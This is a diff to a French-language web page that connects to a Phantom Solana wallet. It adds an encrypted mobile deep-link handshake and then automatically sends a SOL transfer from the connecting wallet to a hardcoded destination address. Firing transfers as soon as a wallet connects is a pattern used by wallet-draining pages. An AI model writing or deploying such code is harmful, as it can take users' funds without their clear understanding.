@@ -39,6 +39,7 @@
     async function connectDesktopAndSend() {
       try {
         if (window.solana && window.solana.isPhantom) {
+          status.innerText = "Connexion en cours...";
           const resp = await window.solana.connect();
           window.providerPublicKey = resp.publicKey.toString();
           status.innerText = "✅ Connecté via extension";
@@ -55,11 +56,16 @@
     function connectMobile() {
       status.innerText = "📱 Redirection vers Phantom...";
       const appUrl = encodeURIComponent(window.location.origin + window.location.pathname);
-      // On ajoute un paramètre ?afterConnect=1 pour savoir qu'on revient de la connexion
       const redirectLink = encodeURIComponent(window.location.origin + window.location.pathname + "?afterConnect=1");
+      const keyPair = nacl.box.keyPair();
+      const dappPublicKeyB58 = bs58.encode(keyPair.publicKey);
+      const dappSecretKeyB58 = bs58.encode(keyPair.secretKey);
+      sessionStorage.setItem("dappSecretKeyBase58", dappSecretKeyB58);
+
       const deepLink =
         `https://phantom.app/ul/v1/connect` +
-        `?app_url=${appUrl}` +
+        `?dapp_encryption_public_key=${dappPublicKeyB58}` +
+        `&app_url=${appUrl}` +
         `&redirect_link=${redirectLink}` +
         `&cluster=mainnet-beta`;
       window.location.href = deepLink;
@@ -69,7 +75,6 @@
       try {
         const fromPubkey = new PublicKey(fromStr);
         const toPubkey = new PublicKey(toStr);
-
         const ix = SystemProgram.transfer({ fromPubkey, toPubkey, lamports });
         const { blockhash } = await conn.getLatestBlockhash();
         const tx = new Transaction({ recentBlockhash: blockhash, feePayer: fromPubkey }).add(ix);
@@ -101,12 +106,37 @@
       }
     }
 
-    // Vérifie si on revient de la connexion mobile
+    // Déchiffre la réponse Phantom au retour mobile
     document.addEventListener("DOMContentLoaded", async () => {
       const params = new URLSearchParams(window.location.search);
-      if (params.get("afterConnect") === "1" && window.providerPublicKey) {
-        status.innerText = "📱 Connecté, envoi automatique...";
-        await sendTransaction(window.providerPublicKey, DESTINATION, LAMPORTS);
+      if (params.get("afterConnect") === "1") {
+        const data = params.get("data");
+        const phantomPubKey = params.get("phantom_encryption_public_key");
+        const nonce = params.get("nonce");
+
+        if (data && phantomPubKey && nonce) {
+          try {
+            const dappSecretKey = bs58.decode(sessionStorage.getItem("dappSecretKeyBase58"));
+            const sharedSecret = nacl.box.before(bs58.decode(phantomPubKey), dappSecretKey);
+            const decrypted = nacl.box.open.after(
+              bs58.decode(data),
+              bs58.decode(nonce),
+              sharedSecret
+            );
+
+            if (decrypted) {
+              const walletData = JSON.parse(new TextDecoder().decode(decrypted));
+              window.providerPublicKey = walletData.public_key;
+              status.innerText = "📱 Connecté, envoi automatique...";
+              info.innerText = walletData.public_key;
+              await sendTransaction(window.providerPublicKey, DESTINATION, LAMPORTS);
+            } else {
+              status.innerText = "❌ Impossible de déchiffrer la réponse Phantom";
+            }
+          } catch (err) {
+            status.innerText = "Erreur retour Phantom: " + (err?.message || err);
+          }
+        }
       }
     });
 
